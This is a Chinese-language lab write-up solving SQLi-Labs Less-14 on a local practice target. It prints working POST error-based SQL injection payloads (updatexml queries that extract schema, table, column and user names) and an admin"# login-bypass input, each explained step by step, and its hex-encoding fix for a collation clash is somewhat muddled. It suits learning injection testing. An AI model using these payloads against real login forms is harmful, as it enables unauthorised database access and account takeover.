SQLi-Labs Less-14

2026年9月26日 SQLi-Labs Web安全 SQL注入 POST报错注入

一、题目信息

  • 题目名称：SQLi-Labs Less-14 (POST - Double Injection - Single quotes- String - with twist)
  • 题目平台：SQLi-Labs 本地靶场
  • 题目类型：Web安全 / SQL注入 / POST型报错注入 / 双引号闭合
  • 靶场链接：http://localhost:8081/Less-14/（本地环境）
  • 涉及工具：Chrome浏览器 (F12开发者工具)

二、解题步骤

1. 分析题目考什么

本题的核心考点是基于双引号闭合的 POST 型报错注入（Double Injection）。Less-14 的官方标签极其具有迷惑性，写着 "Single quotes"（单引号），但实际上后端代码使用的是双引号 " 进行包裹，而且没有括号。这种标签与实际不符的情况，考察的就是渗透测试人员不被表象迷惑、通过实际报错进行闭合测试的能力。

2. 怎么想（破题思路）

  • 如果相信标签用单引号 admin'，页面会报错但无法注入。必须构造报错，让数据库告诉我们真实的闭合方式。
  • 输入 admin" 触发报错，通过报错信息 near '"123"' LIMIT 0,1' 确认闭合方式为双引号。
  • 利用报错函数 updatexml 爆出库名、表名、字段名。
  • 最后利用靶场内置的弱口令（Dumb/Dumb），或万能密码 admin"# 实现登录。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：被官方标签迷惑（Single quotes vs Double quotes）

踩坑情况：尝试 admin' 时页面报错，但加上 # 依然报错，无法进行注入。

原因分析：这是 Less-14 最大的陷阱，后端代码其实是 WHERE username = "$username"，单引号根本无法闭合语法。

改进方式：盲猜双引号 admin"，看到报错信息 near '" and password="123" LIMIT 0,1' 之后，确认闭合方式为双引号。

踩坑记录二：查询 information_schema 时字符集冲突

踩坑情况：输入 admin" and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1)# 时，页面报错 Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (latin1_swedish_ci,COERCIBLE)。

原因分析：系统数据库 information_schema 是 GBK 字符集，而靶场数据库是 latin1。直接使用字符串 'security' 进行比较会导致字符集冲突。

改进方式：使用十六进制 0x7573657273（users 的十六进制编码）替代字符串硬编码，完美绕过冲突。

踩坑记录三：直接查密码出现空白报错

踩坑情况：尝试直接查密码时，页面报错只有 XPATH syntax error: '~'，中间没有内容。

原因分析：updatexml 报错回显最长只有 32 个字符。密码如果是 32 位的 MD5，加上波浪号边界就会超长被截断。

改进方式：使用 substr() 分段读取，或利用弱口令特性。实际测试中，只要爆出用户名 Dumb，直接用 Dumb/Dumb 即可成功登录。

详细实操步骤（Payload逐字解释）

第一步：探测闭合方式

Username 输入 admin"，Password 随便填。报错提示 near '" and password="123" LIMIT 0,1'，说明闭合方式为双引号。

第二步：获取数据库名

admin" and updatexml(1,concat(0x7e,(select database()),0x7e),1)#

逐字解析：

  • admin"：闭合原 SQL 语句中的双引号。
  • and：逻辑与，用于连接注入语句。
  • updatexml(1, XPath格式字符串, 1)：MySQL 的 XML 更新函数，第二个参数不符合 XPath 语法时会直接抛出错误。这是报错注入的核心原理。
  • concat(0x7e, (select database()), 0x7e)：concat 负责拼接字符串，0x7e 是波浪号 ~ 的十六进制，用作边界标识。
  • #：注释掉后面原 SQL 的 " AND password="123" LIMIT 0,1;。

回显：XPATH syntax error: '~security~'，成功拿到数据库名！

第三步：获取表名与列名

查表名（用十六进制避开字符集冲突）：

admin" and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() and table_name=0x7573657273 limit 0,1),0x7e),1)#

回显 ~users~。接着查列名（把 tables 换成 columns，改 limit 偏移量）：

admin" and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=0x7573657273 limit 0,1),0x7e),1)#

修改 limit 依次得到 ~id~、~username~、~password~。

第四步：爆出用户名并登录

admin" and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)#

成功拿到 ~Dumb~。最后回到登录框，Username 填 Dumb，Password 填 Dumb，成功登录。

终极逃课法（万能密码）：直接在 Username 输入 admin"#，Password 随便填，点击 Submit。因为 # 把后面的密码验证全注释了，SQL 变成 SELECT * FROM users WHERE username = "admin"#，直接登录成功。

4. 怎么迁移（跨领域联想）

  • 代码审计与安全开发：Less-14 警示我们不要盲目相信“文档”或“标签”。在真实的代码审计中，即使文档写着“有安全过滤”，我们也要亲自测试各种闭合符号 ', ", '), "), )) 组合。
  • 逻辑漏洞与弱口令：当我们在数据库中直接拿到用户名 Dumb 时，可以联想真实世界中的弱口令攻击（密码等于用户名）。这说明安全是一个整体，SQL注入可能导致信息泄露，而信息泄露又可能结合弱口令彻底沦陷系统。
  • API 接口安全测试：RESTful API 中，POST 请求体经常接收 JSON 数据，如果后端将 JSON 值拼接到 SQL 中，同样会面临与 Less-14 类似的注入风险。

三、名词大全与原理深度复盘

1. Double Injection（双注入）

SQLi-Labs 中用来标记注入类型的一个名词，通常指使用 updatexml、extractvalue 或者 floor 等函数进行报错回显的注入方式。

2. POST 注入

数据通过 HTTP 请求体（Request Body）发送。一般出现在登录、注册等表单提交处。与 GET 注入不同，POST 注入无法直接在 URL 修改，必须使用 Burp Suite、HackBar 或浏览器 F12 来修改请求体。

3. 报错注入（Error-Based）

利用数据库执行错误时抛出的信息，将想要查询的数据通过非法格式（如调用 updatexml）拼接在错误信息中带出来。是一种非常高效的数据回显方式。

4. updatexml() 与 32 字节回显限制

updatexml(XML_document, XPath_string, new_value) 的第二个参数必须是合法的 XPath 格式。当传入类似 ~security~ 的字符串时，MySQL 抛出错误。回显上限为 32 字节，过长数据需使用 substr() 分段截取。

5. 字符集排序（Collation）冲突

MySQL 中的字符串比较需要相同的字符集和排序规则。靶场库是 latin1_swedish_ci，而系统库 information_schema 是 gbk_chinese_ci，两者冲突。使用十六进制字符串或强制转换可以解决。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Less-11 的区别：Less-11 是单引号 '，Less-14 是双引号 "。
  • 与 Less-12 的区别：Less-12 是 ")，Less-14 去掉了括号，变为 "。
  • 与 Less-13 的区别：Less-13 是 ')，Less-14 是 "。且 Less-14 的官方标签具有误导性（写着 Single quotes 实际是 Double quotes），这是此题最大的特色。

2. 这种题目的出现原因（为什么存在）

这种题目存在的原因，通常是开发者在代码迭代中更改了 SQL 语句的拼接方式，但忘记更新文档，或者故意在靶场中设置了与标签不符的陷阱。这也侧面反映了实际开发中代码文档与实际实现容易脱节的问题。

3. 这种应用在实际中如何体现？

在实际红蓝对抗中，当发现一个登录口出现 SQL 报错时，渗透测试人员会第一时间使用 updatexml 尝试报错注入。如果字符集冲突报错，会立刻转换成十六进制重试，这是非常标准的一套组合拳。

4. 如何抽象理解概念（大白话）

把数据库比作一个“带警报器的保险箱”：

  • Less-14 的锁孔形状变成了双引号 "。
  • 虽然提示牌上写着“单引号”，但只有塞入双引号 " 才能触发警报器（报错），警报器会大声喊出保险箱里的秘密。
  • 这就是“标签与实质不符”的典型情况，提醒我们：不要只看标签，要亲自去试探锁孔。
